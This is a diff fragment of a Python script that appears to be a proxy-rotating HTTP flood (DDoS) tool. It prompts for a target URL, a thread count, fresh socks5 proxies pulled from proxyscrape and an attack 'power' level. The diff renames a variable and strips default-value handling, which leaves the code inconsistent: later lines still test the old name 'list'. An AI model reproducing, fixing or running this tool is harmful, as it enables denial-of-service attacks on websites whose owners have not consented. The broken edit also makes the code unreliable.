@@ -40,17 +40,13 @@ def opth():
 	
 def main():
 	global pprr
-	global list
+	global litt
 	global proxy
 	global url
 	global pwr
 	global thr
 	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
 	thr = int(input(Fore.BLUE + "Threads (Default Is 300) : " + Fore.WHITE))
-	if thr == "":
-		thr = int(300)
-	else:
-		thr = int(thr)
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
 		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000&country=all')
@@ -59,20 +55,16 @@ def main():
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
 	else:
 		pass
-	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
+	litt = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
 	if list == "":
 		list = 'socks.txt'
 	else:
 		list = str(list)
 	pwr = int(input(Fore.BLUE + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
-	if pwr == "":
-		pwr = int(70)
-	else:
-		pwr = int(pwr)
 	opth()
 
 def atk():
-	pprr = open(list).readlines()
+	pprr = open(litt).readlines()
 	proxy = random.choice(pprr).strip().split(":")
 	s = requests.session()
 	s.proxies = {}
